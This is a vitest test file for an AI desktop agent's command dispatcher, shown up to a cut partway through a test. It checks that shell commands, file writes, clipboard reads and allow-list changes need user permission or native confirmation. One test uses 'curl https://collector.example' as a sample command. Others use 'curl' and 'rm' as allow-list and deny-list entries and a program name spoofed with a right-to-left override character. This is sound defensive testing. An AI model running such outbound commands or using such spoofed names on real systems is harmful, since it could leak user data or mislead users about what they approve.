import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import {
  APPLICATION_COMMANDS,
  BROWSER_PAIRING_COMMANDS,
  BROWSER_SIGN_IN_START,
  BROWSER_SIGN_IN_CANCEL,
  BROWSER_SIGN_IN_STATE,
  BROWSER_STEP_COMMAND,
  CLIPBOARD_COMMANDS,
  DESKTOP_RUNTIME_EVENT_CHANNEL,
  DEVELOPER_SESSION_COMMANDS,
  DEVICE_HOST_COMMANDS,
  DEVICE_REGISTRY_PROFILE_COMMAND,
  DEVICE_STEP_TOOLS,
  DISPATCH_TASK_REPORT,
  DISPATCH_TASK_RUNNER_READY,
  FILESYSTEM_COMMANDS,
  LOCAL_INFERENCE_COMMANDS,
  LOCAL_ROUTINE_COMMANDS,
  SSH_ENVIRONMENT_COMMANDS,
  PERMISSION_COMMANDS,
  REMOTE_CONTROL_COMMANDS,
  SHELL_COMMANDS,
  WINDOW_LAYOUT_COMMANDS,
  WORKSPACE_COMMANDS,
  deviceStepCommand,
  worktreeRootId,
} from '@agiworkforce/local-runtime-contract';
import type {
  DeveloperApprovalRequest,
  PermissionDecision,
  PermissionScope,
  PermissionState,
  WorkspaceRoot,
} from '@agiworkforce/local-runtime-contract';

const root: WorkspaceRoot = {
  id: 'root-1',
  path: '/approved/project',
  name: 'project',
  grantedAtMs: 0,
  lastOpenedAtMs: 0,
};

const getPermissionState = vi.fn<() => PermissionState>();
const requestPermission = vi.fn<() => Promise<PermissionState>>();
const consumeSingleUse = vi.fn();
const revokePermission = vi.fn();
const listPermissions = vi.fn<() => PermissionDecision[]>(() => []);
const revokeRoot = vi.fn();
const stopDeveloperRuntime = vi.fn();
const stopRemoteControl = vi.fn(() => ({ status: 'idle' }));
const stopComputerUse = vi.fn(() => ({ phase: 'idle' }));
const takeOverComputerUse = vi.fn(() => ({ phase: 'paused' }));
const handBackComputerUse = vi.fn(() => ({ phase: 'active' }));
const computerUsePhase = vi.fn(() => 'idle');
const enterScreenStep = vi.fn(async () => undefined);
const screenChangesSeen = vi.fn(() => 0);
const captureScreen = vi.fn();
const runShellCommand = vi.fn();
const cancelShellRun = vi.fn();
const readShellPolicy = vi.fn();
const writeShellPolicy = vi.fn();
const openWithDefaultApplication = vi.fn();
const revealInFileManager = vi.fn();
const openInEditor = vi.fn();
const readClipboard = vi.fn();
const writeTextFile = vi.fn();
class WriteConflict extends Error {}
const sendBrowserCommand = vi.fn();
const browserConnection = { paired: true, connected: true };
const openExternal = vi.fn(async () => undefined);
const send = vi.fn();

vi.mock('electron', () => ({
  app: { getPath: () => '/tmp', getVersion: () => '1.8.0' },
  dialog: { showOpenDialog: vi.fn(), showMessageBox: vi.fn() },
  shell: { openPath: vi.fn(), openExternal },
}));

const REVIEW = { decisions: [], system: {} };
const reviewPermissions = vi.fn(() => REVIEW);
vi.mock('../runtime/permissionManager', () => ({
  authorizeRemoteCommand: vi.fn(),
  permissionRevision: () => 1,
  describePermission: (capability: string, scope: PermissionScope) =>
    `${capability} in ${scope.target ?? 'this Mac'}`,
  describePermissionDecision: vi.fn(),
  getPermissionState,
  listPermissions,
  recordDecision: vi.fn(),
  requestPermission,
  consumeSingleUse,
  reviewPermissions,
  revokePermission,
  revokeScope: vi.fn(),
  withdrawGrant: vi.fn(),
}));

vi.mock('../runtime/computerUseService', () => ({
  ComputerUseRefused: class extends Error {
    readonly reason: string;
    constructor(reason: string, message: string) {
      super(message);
      this.reason = reason;
    }
  },
  applicationAt: vi.fn(async () => ({
    name: 'TextEdit',
    bundleId: 'com.apple.TextEdit',
    pid: 4242,
  })),
  applicationInFront: vi.fn(async () => ({
    name: 'TextEdit',
    bundleId: 'com.apple.TextEdit',
    pid: 4242,
  })),
  captureRegion: vi.fn(),
  captureScreen,
  clickPointer: vi.fn(),
  computerUseAvailability: () => ({ supported: true }),
  computerUseSupport: () => ({ supported: true }),
  dragPointer: vi.fn(),
  forgetLastFrame: vi.fn(),
  frontWindowIdOutside: vi.fn(async () => null),
  movePointer: vi.fn(),
  readFrontWindow: vi.fn(async () => ({ front: null, secureInput: false })),
  screenCaptureAllowed: () => true,
  screenChangesSeen,
  pressKey: vi.fn(),
  scrollPointer: vi.fn(),
  stopComputerUseHelper: vi.fn(),
  typeText: vi.fn(),
  waitFor: vi.fn(),
}));

vi.mock('../runtime/computerUseSession', () => ({
  askUserDuringRun: vi.fn((_window: unknown, ask: () => Promise<unknown>) => ask()),
  configureComputerUse: vi.fn(),
  shutDownComputerUse: vi.fn(),
  computerUseEnabled: () => true,
  computerUsePhase,
  computerUseStatus: vi.fn(() => ({ phase: computerUsePhase() })),
  confirmScreenStepStillWanted: vi.fn(async () => undefined),
  enterScreenStep,
  finishComputerUse: vi.fn(),
  handBackComputerUse,
  refuseScreenStepEarly: vi.fn(),
  setComputerUseEnabled: vi.fn(),
  stopComputerUse,
  takeOverComputerUse,
  withoutInputWatch: vi.fn((action: () => Promise<unknown>) => action()),
}));

vi.mock('../runtime/systemPermissions', () => ({
  listForAccessibility: vi.fn(),
  openSystemPermission: vi.fn(),
  systemPermissionStatus: vi.fn(() => 'granted'),
  systemPermissionStatuses: vi.fn(() => ({})),
}));

vi.mock('../runtime/workspaceStore', () => ({
  getRoot: (id: string) => (id === root.id ? root : undefined),
  listRoots: () => [root],
  grantRoot: vi.fn(),
  revokeRoot,
  worktreeRootIds: (id: string) => (id === root.id ? [`${root.id}::worktree-1`] : []),
  setRootGit: vi.fn(),
  admitWorktreeRoot: vi.fn(),
  forgetWorktreeRoot: vi.fn(),
  WorkspaceGrantRefused: class extends Error {},
  WorktreeRootRefused: class extends Error {},
}));

vi.mock('../runtime/shellService', () => ({
  INHERITED_ENV_ALLOWLIST: [],
  activeShellRunCount: vi.fn(() => 0),
  cancelAllShellRuns: vi.fn(),
  childEnvironment: vi.fn(),
  isWithheldVariable: vi.fn(() => false),
  pinnedRootPath: vi.fn(),
  runShellCommand,
  cancelShellRun,
  listShellRuns: vi.fn(() => []),
  readBackgroundCommand: vi.fn(),
  shellRunsIn,
  startBackgroundCommand: vi.fn(),
  stopBackgroundCommand: vi.fn(),
  terminalText: vi.fn((raw: string) => raw),
}));
vi.mock('../runtime/shellPolicyStore', () => ({ readShellPolicy, writeShellPolicy }));
const NOTES = {
  name: 'Notes',
  bundleId: 'com.apple.Notes',
  path: '/System/Applications/Notes.app',
};
const findInstalledApplication = vi.fn(async () => NOTES);
const launchApplication = vi.fn(async () => true as const);
vi.mock('../runtime/applicationLaunch', () => ({ findInstalledApplication, launchApplication }));
vi.mock('../runtime/appsService', () => ({
  editorFileUrl: vi.fn(),
  openInEditor,
  openWithDefaultApplication,
  revealInFileManager,
}));
vi.mock('../runtime/clipboardService', () => ({ readClipboard }));
vi.mock('../runtime/filesystemService', () => ({
  OPEN_FILE_FOR_CHECKED_READ: 0,
  openChecked: vi.fn(),
  TextEditRefused: class extends Error {},
  WriteConflict,
  editTextFile: vi.fn(),
  globFiles: vi.fn(),
  grepFiles: vi.fn(),
  listDirectory: vi.fn(),
  readBinaryFile: vi.fn(),
  readTextFile: vi.fn(),
  writeTextFile,
}));
vi.mock('../runtime/gitService', () => ({
  discardWorkingTreeChanges: vi.fn(),
  findRepositoryRoot: vi.fn(),
  hostGitInvocation: vi.fn(),
  listLocalBranches: vi.fn(),
  pushLocalBranch: vi.fn(),
  readGitState: vi.fn(),
  readWorkingTreeChanges: vi.fn(),
  readWorkingTreeDiff: vi.fn(),
  readWorkspaceGit: vi.fn(async () => ({ git: null, unavailableReason: null })),
  switchLocalBranch: vi.fn(),
}));
const reportShellIdentity = vi.fn();
const syncDeveloperAccounts = vi.fn(async () => undefined);
vi.mock('../shellIdentity', () => ({
  approveDeviceCode: vi.fn(),
  onShellIdentityReported: vi.fn(),
  postAsShellAccount: vi.fn(),
  readShellIdentity: vi.fn(),
  reportShellIdentity,
}));
const readShellLayout = vi.fn(() => ({ sidebarCollapsed: true, secondaryPanelWidth: 380 }));
const writeShellLayout = vi.fn((patch: Record<string, unknown>) => ({
  sidebarCollapsed: patch['sidebarCollapsed'] ?? null,
  secondaryPanelWidth: patch['secondaryPanelWidth'] ?? null,
}));
vi.mock('../shellWindowStore', () => ({
  patchShellWindowState: vi.fn(),
  readShellLayout,
  readShellWindowState: vi.fn(),
  windowStatePath: vi.fn(),
  writeShellLayout,
}));
vi.mock('../runtime/deviceIdentity', () => ({
  deviceIdentity: () => ({ deviceId: 'install-0000-1111', deviceName: 'Studio Mac' }),
}));
vi.mock('../browser/bridgeServer', async (importOriginal) => ({
  ...(await importOriginal<Record<string, unknown>>()),
  pairingState: () => browserConnection,
  sendBrowserCommand,
}));
const startRemoteControl = vi.fn((args: Record<string, unknown>) => ({ status: 'waiting', args }));
vi.mock('../remote/remoteControlService', () => ({
  APPROVAL_CONFIRM_TIMEOUT_MS: 120_000,
  configureRemoteControl: vi.fn(),
  relayDeveloperSessionEvent: vi.fn(),
  remoteControlActive: () => false,
  remoteControlAvailable: () => true,
  remoteControlState: () => ({ status: 'idle' }),
  reportDispatchTask: vi.fn(),
  setDispatchTaskRunner: vi.fn(),
  startRemoteControl,
  stopRemoteControl,
}));
const listDeveloperSessions = vi.fn(async (includeRoot: (candidate: WorkspaceRoot) => boolean) => ({
  groups: [root].filter(includeRoot).map((candidate) => ({ rootId: candidate.id })),
}));
const readDeveloperSession = vi.fn(async () => ({ session: {}, messages: [], truncated: false }));
const archiveDeveloperThread = vi.fn(async () => true);
const takeOverDeveloperThread = vi.fn(async () => ({ id: 't-1' }));
const MCP_LAUNCH = {
  name: 'github',
  scope: 'project' as const,
  question:
    "This project's MCP file starts server 'github': npx -y @acme/github-mcp (in the sandbox, started in this project folder). Allow it in /approved/project?",
  fingerprint: 'f'.repeat(64),
  launch: {
    project: '/approved/project',
    program: '/usr/local/bin/npx',
    args: ['-y', '@acme/github-mcp'],
    env: [{ name: 'GITHUB_TOKEN', value: null, notPassed: false }],
    workingFolder: '/approved/project',
    files: ['package.json'],
    sandbox: 'sandboxed' as const,
    network: 'internet' as const,
    url: null,
    headerNames: [],
    authorizeUrl: null,
    tokenUrl: null,
    oauthScope: null,
    oauthClientId: null,
    oauthRedirectUri: null,
    oauthClientSecretSet: false,
    askedAtEveryStart: false,
  },
};
const readDeveloperMcpApproval = vi.fn(async () => MCP_LAUNCH);
const grantDeveloperMcpApproval = vi.fn(async () => []);
const startDeveloperSession = vi.fn();
const startDeveloperTurn = vi.fn(async () => ({ turnId: 'turn-1' }));
const steerDeveloperTurn = vi.fn(async () => ({ turnId: 'turn-1' }));
const answerDeveloperApproval = vi.fn(async () => true);
const answerDeveloperUserInput = vi.fn(async () => true);
const PAGE_ANSWERABLE_APPROVAL: DeveloperApprovalRequest = {
  requestId: 'ask-1',
  kind: 'Exec',
  summary: 'Run pnpm test',
  detail: '',
  command: 'pnpm test',
  riskLevel: 'low',
  reversible: true,
};
type Reservation =
  'outside-folder' | 'protected-path' | 'unknown-remote' | 'named-host' | 'unread-request';
interface ApprovalReview {
  request: DeveloperApprovalRequest;
  reserved: Reservation[];
}
function review(
  overrides: Partial<DeveloperApprovalRequest> = {},
  reserved: Reservation[] = [],
): ApprovalReview {
  return { request: { ...PAGE_ANSWERABLE_APPROVAL, ...overrides }, reserved };
}
const readPendingApproval = vi.fn<() => Promise<ApprovalReview | null>>(async () => review());
const shellRunsIn = vi.fn<(rootId: string) => string[]>(() => []);
const SETUP_SCRIPT = Buffer.from('#!/bin/sh\npnpm install\n', 'utf8');
const SETUP_SHA256 = createHash('sha256').update(SETUP_SCRIPT).digest('hex');
const readWorktreeSetupScript = vi.fn<() => Promise<{ path: string; worktree: string } | null>>();
const runDeveloperWorktreeSetup = vi.fn(async () => true);
const readRegularFile = vi.fn<() => Promise<Buffer | null>>();
const deleteDeveloperThread = vi.fn(async () => ({
  acknowledged: true,
  keptWorktreeArchives: [],
  removedWorktreeArchives: [],
  releasedWorktrees: [],
}));
const forkDeveloperThread = vi.fn(async () => ({ id: 'thread-branch' }));
const compactDeveloperThread = vi.fn(async () => ({ threadId: 't-1', compacted: true }));
vi.mock('../runtime/developerSessionService', async (importOriginal) => ({
  ...(await importOriginal<Record<string, unknown>>()),
  syncDeveloperAccounts,
  listDeveloperSessions,
  readDeveloperSession,
  archiveDeveloperThread,
  takeOverDeveloperThread,
  readDeveloperMcpApproval,
  grantDeveloperMcpApproval,
  startDeveloperTurn,
  startDeveloperSession,
  steerDeveloperTurn,
  answerDeveloperApproval,
  answerDeveloperUserInput,
  deleteDeveloperThread,
  forkDeveloperThread,
  compactDeveloperThread,
  readPendingApproval,
  readWorktreeSetupScript,
  runDeveloperWorktreeSetup,
  stopDeveloperRuntime,
}));
vi.mock('../runtime/regularFile', async (importOriginal) => ({
  ...(await importOriginal<Record<string, unknown>>()),
  readRegularFile,
}));

const { DeveloperThreadHeldError } = await import('../runtime/developerSessionService');
const { beginApprovalConfirmation, resetApprovalConfirmations } =
  await import('../runtime/approvalConfirmations');
const {
  SCREEN_STEP_COMMANDS,
  commandGates,
  dispatch,
  shellApprovalDialog,
  noteDeveloperSessionEvent,
  resetScreenStepGate,
  windowAnswersUserInput,
} = await import('../runtime/dispatcher');
const { dialog } = await import('electron');
const { movePointer } = vi.mocked(await import('../runtime/computerUseService'));
const { resetNativeQuestions } = await import('../runtime/nativeQuestions');
const { allowComputerRun, COMPUTER_RUN_IDLE_MS, resetComputerRuns } =
  await import('../runtime/computerUseRuns');

const RUN = 'run-screen-1';
/** A screen step of a run the person at this computer has allowed. */
const screenStep = (command: string, args: Record<string, unknown> = {}) =>
  dispatch(window, command, { runId: RUN, ...args });
const showMessageBox = vi.mocked(dialog.showMessageBox);

let pageUrl = 'https://agiworkforce.com/code';
const window = {
  isDestroyed: () => false,
  webContents: { send, isDestroyed: () => false, getURL: () => pageUrl },
} as unknown as Parameters<typeof dispatch>[0];

beforeEach(() => {
  vi.clearAllMocks();
  resetApprovalConfirmations();
  resetNativeQuestions();
  resetComputerRuns();
  resetScreenStepGate();
  showMessageBox.mockResolvedValue({ response: 0, checkboxChecked: false });
  enterScreenStep.mockResolvedValue(undefined);
  computerUsePhase.mockReturnValue('idle');
  getPermissionState.mockReturnValue('granted');
  readPendingApproval.mockResolvedValue(review());
  shellRunsIn.mockReturnValue([]);
  listPermissions.mockReturnValue([]);
  pageUrl = 'https://agiworkforce.com/code';
  browserConnection.paired = true;
  browserConnection.connected = true;
  readWorktreeSetupScript.mockResolvedValue({
    path: '/approved/project/.agiworkforce/worktree-setup',
    worktree: 'project · retry fix',
  });
  readRegularFile.mockResolvedValue(SETUP_SCRIPT);
  readShellPolicy.mockReturnValue({ allow: ['git'], deny: [] });
  writeShellPolicy.mockImplementation((policy: unknown) => policy);
  runShellCommand.mockResolvedValue({ runId: 'run-1', exitCode: 0 });
});

function scopeOf(call: unknown[]): PermissionScope {
  return call[2] as PermissionScope;
}

describe('dispatch, local command gating', () => {
  it('requires shell.execute scoped to the workspace', async () => {
    getPermissionState.mockReturnValue('prompt');
    requestPermission.mockResolvedValue('granted');

    const response = await dispatch(window, 'shell_run', {
      rootId: root.id,
      runId: 'run-1',
      command: 'git status',
    });

    expect(response.ok).toBe(true);
    expect(requestPermission).toHaveBeenCalledTimes(1);
    const call = requestPermission.mock.calls[0] as unknown as unknown[];
    expect(call[1]).toBe('shell.execute');
    expect(scopeOf(call)).toEqual({ kind: 'workspace', target: root.path });
  });

  it('refuses to run when the capability is denied, and never reaches the service', async () => {
    getPermissionState.mockReturnValue('denied');

    const response = await dispatch(window, 'shell_run', {
      rootId: root.id,
      runId: 'run-1',
      command: 'git status',
    });

    expect(response).toMatchObject({
      ok: false,
      error: { code: 'permission-denied', capability: 'shell.execute' },
    });
    expect(runShellCommand).not.toHaveBeenCalled();
  });

  it('refuses a command for a workspace that is no longer approved', async () => {
    const response = await dispatch(window, 'shell_run', {
      rootId: 'gone',
      runId: 'run-1',
      command: 'git status',
    });
    expect(response).toMatchObject({ ok: false, error: { code: 'not-found' } });
    expect(runShellCommand).not.toHaveBeenCalled();
  });

  it('streams output to the renderer as a runtime event', async () => {
    runShellCommand.mockImplementation(async (input: { emit: (chunk: unknown) => void }) => {
      input.emit({ runId: 'run-1', stream: 'stdout', chunk: 'hello' });
      return { runId: 'run-1', exitCode: 0 };
    });

    await dispatch(window, 'shell_run', {
      rootId: root.id,
      runId: 'run-1',
      command: 'git status',
    });

    expect(send).toHaveBeenCalledWith('agi:desktop-runtime-event', {
      kind: 'shell-output',
      runId: 'run-1',
      stream: 'stdout',
      chunk: 'hello',
    });
  });

  it("sends a command's output nowhere once the window has left the app for another page", async () => {
    runShellCommand.mockImplementation(async (input: { emit: (chunk: unknown) => void }) => {
      pageUrl = 'https://accounts.google.com/o/oauth2/auth';
      input.emit({ runId: 'run-1', stream: 'stdout', chunk: 'secret output' });
      pageUrl = 'data:text/html,offline';
      input.emit({ runId: 'run-1', stream: 'stdout', chunk: 'more' });
      return { runId: 'run-1', exitCode: 0 };
    });

    await dispatch(window, 'shell_run', { rootId: root.id, runId: 'run-1', command: 'git status' });

    expect(send).not.toHaveBeenCalled();
  });

  it('lifts the network block for one run only when the box in the approval is ticked', async () => {
    const ask = (sandboxed: boolean) => {
      runShellCommand.mockImplementationOnce(
        async (input: { approve: (request: unknown) => Promise<unknown> }) =>
          input.approve({
            verdict: { program: 'npm' },
            command: 'npm install',
            cwd: root.path,
            sandboxed,
          }),
      );
      return dispatch(window, 'shell_run', {
        rootId: root.id,
        runId: 'run-1',
        command: 'npm install',
      });
    };

    showMessageBox.mockResolvedValueOnce({ response: 1, checkboxChecked: true });
    expect(await ask(true)).toEqual({ ok: true, value: { approved: true, allowNetwork: true } });
    const sandboxedPrompt = (showMessageBox.mock.calls[0] as unknown[])[1] as {
      checkboxLabel?: string;
      checkboxChecked?: boolean;
    };
    expect(sandboxedPrompt.checkboxLabel).toBe('Allow network access for this command');
    expect(sandboxedPrompt.checkboxChecked).toBe(false);

    showMessageBox.mockResolvedValueOnce({ response: 1, checkboxChecked: false });
    expect(await ask(true)).toEqual({ ok: true, value: { approved: true, allowNetwork: false } });

    showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: true });
    expect(await ask(true)).toEqual({ ok: true, value: { approved: false, allowNetwork: false } });

    // The same command straight after a Cancel is not asked about again.
    showMessageBox.mockResolvedValueOnce({ response: 1, checkboxChecked: true });
    expect(await ask(true)).toEqual({ ok: true, value: { approved: false, allowNetwork: false } });
    expect(showMessageBox).toHaveBeenCalledTimes(3);

    resetNativeQuestions();
    expect(await ask(false)).toEqual({ ok: true, value: { approved: true, allowNetwork: false } });
    const unsandboxedPrompt = (showMessageBox.mock.calls[3] as unknown[])[1] as {
      checkboxLabel?: string;
    };
    expect(unsandboxedPrompt.checkboxLabel).toBeUndefined();
  });

  it('hands a server-set review to the shell service even under an always grant', async () => {
    getPermissionState.mockReturnValue('granted');

    await dispatch(window, 'shell_run', {
      rootId: root.id,
      runId: 'run-1',
      command: 'curl https://collector.example',
      review: 'Run curl https://collector.example in Documents',
    });

    expect(requestPermission).not.toHaveBeenCalled();
    expect(runShellCommand).toHaveBeenCalledWith(
      expect.objectContaining({ review: 'Run curl https://collector.example in Documents' }),
    );
  });

  it('rejects a command argument that is not a string', async () => {
    const response = await dispatch(window, 'shell_run', {
      rootId: root.id,
      runId: 'run-1',
      command: 42,
    });
    expect(response).toMatchObject({ ok: false, error: { code: 'invalid-arguments' } });
  });

  it('rejects a timeout that is not a number', async () => {
    const response = await dispatch(window, 'shell_run', {
      rootId: root.id,
      runId: 'run-1',
      command: 'git status',
      timeoutMs: 'soon',
    });
    expect(response).toMatchObject({ ok: false, error: { code: 'invalid-arguments' } });
  });
});

describe('dispatch, writing a file over the version the caller read', () => {
  const expectedSha256 = 'e'.repeat(64);

  it('hands the version to the write', async () => {
    writeTextFile.mockResolvedValue({ path: 'a.ts', sha256: 'f'.repeat(64) });

    const response = await dispatch(window, 'file_write_text', {
      rootId: root.id,
      path: 'a.ts',
      text: 'x',
      expectedSha256,
    });

    expect(response.ok).toBe(true);
    expect(writeTextFile).toHaveBeenCalledWith(root, 'a.ts', 'x', expectedSha256);
  });

  it('writes with no precondition when the caller sends no version', async () => {
    writeTextFile.mockResolvedValue({ path: 'a.ts' });

    await dispatch(window, 'file_write_text', { rootId: root.id, path: 'a.ts', text: 'x' });

    expect(writeTextFile).toHaveBeenCalledWith(root, 'a.ts', 'x', undefined);
  });

  it('refuses a version that is not a SHA-256 digest before touching the disk', async () => {
    const response = await dispatch(window, 'file_write_text', {
      rootId: root.id,
      path: 'a.ts',
      text: 'x',
      expectedSha256: 'stale',
    });

    expect(response).toMatchObject({ ok: false, error: { code: 'invalid-arguments' } });
    expect(writeTextFile).not.toHaveBeenCalled();
  });

  it('answers a write refused over a newer version with the conflict code', async () => {
    writeTextFile.mockRejectedValue(new WriteConflict('a.ts changed on disk since it was read.'));

    const response = await dispatch(window, 'file_write_text', {
      rootId: root.id,
      path: 'a.ts',
      text: 'x',
      expectedSha256,
    });

    expect(response).toEqual({
      ok: false,
      error: { code: 'conflict', message: 'a.ts changed on disk since it was read.' },
    });
  });
});

describe('dispatch, the window layout the shell holds', () => {
  it('reads the layout without a workspace', async () => {
    const response = await dispatch(window, 'window_layout_read', {});
    expect(response).toEqual({
      ok: true,
      value: { sidebarCollapsed: true, secondaryPanelWidth: 380 },
    });
  });

  it('hands a layout change to the store that outlives the window', async () => {
    const response = await dispatch(window, 'window_layout_write', { sidebarCollapsed: false });
    expect(writeShellLayout).toHaveBeenCalledWith({ sidebarCollapsed: false });
    expect(response).toMatchObject({ ok: true, value: { sidebarCollapsed: false } });
  });
});

describe('dispatch, policy and clipboard', () => {
  it('reads the command policy without a workspace', async () => {
    const response = await dispatch(window, 'shell_policy_read', {});
    expect(response).toEqual({ ok: true, value: { allow: ['git'], deny: [] } });
  });

  it('refuses a policy that is not made of program names', async () => {
    const response = await dispatch(window, 'shell_policy_write', {
      policy: { allow: [1], deny: [] },
    });
    expect(response).toMatchObject({ ok: false, error: { code: 'invalid-arguments' } });
    expect(writeShellPolicy).not.toHaveBeenCalled();
  });

  it('writes a policy that adds no program without asking', async () => {
    const policy = { allow: ['git'], deny: ['rm'] };
    const response = await dispatch(window, 'shell_policy_write', { policy });
    expect(response).toEqual({ ok: true, value: policy });
    expect(showMessageBox).not.toHaveBeenCalled();
  });

  it('takes a program off the allowed list without asking', async () => {
    readShellPolicy.mockReturnValue({ allow: ['git', 'pnpm'], deny: [] });
    const response = await dispatch(window, 'shell_policy_write', {
      policy: { allow: ['git'], deny: [] },
    });
    expect(response).toEqual({ ok: true, value: { allow: ['git'], deny: [] } });
    expect(showMessageBox).not.toHaveBeenCalled();
  });

  // An allowed program skips the per-command prompt, so the page adding one is
  // asking for a standing grant, and only the user can give it.
  const commandsAllowed = [
    {
      capability: 'shell.execute',
      scope: { kind: 'workspace', target: root.path },
      state: 'granted',
    },
  ];

  // The list is part of what the command grant gives. A page that holds that
  // grant nowhere has nothing to change it for, and raises no dialog.
  it('adds nothing, and asks nothing, while local commands are allowed in no folder', async () => {
    const response = await dispatch(window, 'shell_policy_write', {
      policy: { allow: ['git', 'curl'], deny: [] },
    });

    expect(response).toMatchObject({ ok: false, error: { code: 'invalid-arguments' } });
    expect(showMessageBox).not.toHaveBeenCalled();
    expect(writeShellPolicy).not.toHaveBeenCalled();

    const removed = await dispatch(window, 'shell_policy_write', {
      policy: { allow: [], deny: [] },
    });
    expect(removed).toMatchObject({ ok: true });
  });

  it('asks natively before adding programs, naming each one', async () => {
    listPermissions.mockReturnValue(commandsAllowed);
    showMessageBox.mockResolvedValueOnce({ response: 1, checkboxChecked: false });
    const policy = { allow: ['git', 'pnpm', 'curl'], deny: [] };
    const response = await dispatch(window, 'shell_policy_write', { policy });

    expect(response).toEqual({ ok: true, value: policy });
    const options = (showMessageBox.mock.calls[0] as unknown[])[1] as {
      detail: string;
      defaultId: number;
      cancelId: number;
    };
    expect(options.detail).toContain('pnpm\ncurl');
    expect(options.detail).not.toContain('git\n');
    expect(options).toMatchObject({ defaultId: 0, cancelId: 0 });
  });

  it('refuses an added program name that the dialog could not show faithfully', async () => {
    const response = await dispatch(window, 'shell_policy_write', {
      policy: { allow: ['git', 'cur\u202El'], deny: [] },
    });

    expect(response).toMatchObject({ ok: false, error: { code: 'invalid-arguments' } });
    expect(showMessageBox).not.toHaveBeenCalled();
    expect(writeShellPolicy).not.toHaveBeenCalled();
  });

  it('leaves the policy alone when the user does not confirm an addition, and does not ask again at once', async () => {
    listPermissions.mockReturnValue(commandsAllowed);
    showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });
    const write = () =>
      dispatch(window, 'shell_policy_write', { policy: { allow: ['git', 'curl'], deny: [] } });

    expect(await write()).toMatchObject({ ok: false, error: { code: 'cancelled' } });
    expect(await write()).toMatchObject({
      ok: false,
      error: { code: 'cancelled', message: expect.stringContaining('was not asked again') },
    });
    expect(showMessageBox).toHaveBeenCalledTimes(1);
    expect(writeShellPolicy).not.toHaveBeenCalled();
  });

  it('asks for the clipboard with a global scope, not a workspace one', async () => {
    getPermissionState.mockReturnValue('prompt');
    requestPermission.mockResolvedValue('granted');
    readClipboard.mockReturnValue({ text: 'copied', textTruncated: false });

    const response = await dispatch(window, 'clipboard_read', {});

    expect(response).toEqual({ ok: true, value: { text: 'copied', textTruncated: false } });
    const call = requestPermission.mock.calls[0] as unknown as unknown[];
    expect(call[1]).toBe('clipboard.read');
    expect(scopeOf(call)).toEqual({ kind: 'global' });
  });

  it('returns nothing from the clipboard when the user refuses', async () => {
    getPermissionState.mockReturnValue('prompt');
    requestPermission.mockResolvedValue('denied');

    const response = await dispatch(window, 'clipboard_read', {});

    expect(response).toMatchObject({ ok: false, error: { code: 'permission-denied' } });
    expect(readClipboard).not.toHaveBeenCalled();
  });
});

describe('dispatch, opening files', () => {
  it('gates opening a file on application.control', async () => {
    getPermissionState.mockReturnValue('prompt');
    requestPermission.mockResolvedValue('granted');
    openWithDefaultApplication.mockResolvedValue({ path: 'a.md', opened: true });

    await dispatch(window, 'app_open_path', { rootId: root.id, path: 'a.md' });

    const call = requestPermission.mock.calls[0] as unknown as unknown[];
    expect(call[1]).toBe('application.control');
  });

  it('gates revealing a file on filesystem.read', async () => {
    getPermissionState.mockReturnValue('prompt');
    requestPermission.mockResolvedValue('granted');
    revealInFileManager.mockResolvedValue({ path: 'a.md', opened: true });

    await dispatch(window, 'app_reveal_path', { rootId: root.id, path: 'a.md' });

    const call = requestPermission.mock.calls[0] as unknown as unknown[];
    expect(call[1]).toBe('filesystem.read');
  });

  it('gates opening a folder in VS Code on application.control for that folder', async () => {
    getPermissionState.mockReturnValue('prompt');
    requestPermission.mockResolvedValue('granted');
    openInEditor.mockResolvedValue({ path: '', opened: true });

    const response = await dispatch(window, 'app_open_in_editor', { rootId: root.id });

    const call = requestPermission.mock.calls[0] as unknown as unknown[];
    expect(call[1]).toBe('application.control');
    expect(scopeOf(call)).toEqual({ kind: 'workspace', target: root.path });
    expect(openInEditor).toHaveBeenCalledWith(root);
    expect(response).toMatchObject({ ok: true, value: { opened: true } });
  });

  it('refuses a picker kind it does not know before any dialog opens', async () => {
    const response = await dispatch(window, 'workspace_pick_root', { kind: 'drive' });
    expect(response).toMatchObject({ ok: false, error: { code: 'invalid-arguments' } });
  });

  it('passes on why a write was refused, with the reason a hard-linked file gives', async () => {
    const { PathRefused } = await import('../runtime/pathGuard');
    const { writeTextFile } = await import('../runtime/filesystemService');
    const message =
      'notes.txt is shared with another location through a hard link, so AGI Cloud will not overwrite it.';
    vi.mocked(writeTextFile).mockRejectedValueOnce(new PathRefused('shared-file', message));
    vi.mocked(writeTextFile).mockRejectedValueOnce(new PathRefused('traversal', 'moved'));
    const write = () =>
      dispatch(window, 'file_write_text', { rootId: root.id, path: 'notes.txt', text: 'x' });

    expect(await write()).toMatchObject({
      ok: false,
      error: { code: 'permission-denied', message },
    });
    expect(await write()).toMatchObject({ ok: false, error: { code: 'outside-workspace' } });
  });

  it('still refuses a command it cannot classify', async () => {
    const response = await dispatch(window, 'shell_run_unchecked', { rootId: root.id });
    expect(response).toMatchObject({ ok: false, error: { code: 'unknown-command' } });
  });
});

describe('dispatch, local models', () => {
  const LOCAL_COMMANDS: readonly string[] = LOCAL_INFERENCE_COMMANDS;

  it('refuses every local inference command on the cloud-only shell', async () => {
    getPermissionState.mockReturnValue('granted');

    for (const command of LOCAL_COMMANDS) {
      const response = await dispatch(window, command, {});
      expect(response).toMatchObject({ ok: false, error: { code: 'unsupported-platform' } });
    }
  });

  it('refuses before asking for permission or touching a local server', async () => {
    getPermissionState.mockReturnValue('prompt');

    for (const command of LOCAL_COMMANDS) {
      await dispatch(window, command, {});
    }

    expect(requestPermission).not.toHaveBeenCalled();
  });
});

/**
 * The prompt is the only place a user gets to say no, so its sentence has to
 * be one they can answer: who is asking, where, and what they are being asked
 * to allow.
 */
describe('the browser capability prompt', () => {
  beforeEach(() => {
    getPermissionState.mockReturnValue('prompt');
    requestPermission.mockResolvedValue('denied');
  });

  async function ask(caller?: {
    name: string;
    subject: string;
    folder: string | null;
    path: string | null;
  }) {
    const { runBrowserCommand } = await import('../runtime/dispatcher');
    await runBrowserCommand(null, 'browser_read_page', {}, caller);
    const call = requestPermission.mock.calls.at(-1) as unknown[] | undefined;
    return {
      scope: call?.[2] as PermissionScope,
      reason: String(call?.[3] ?? ''),
      question: (call?.[4] ?? {}) as { subject?: string; objectPhrase?: string },
    };
  }

  it('asks about the browser, with the client as the subject', async () => {
    const { question, scope } = await ask({
      name: 'agi',
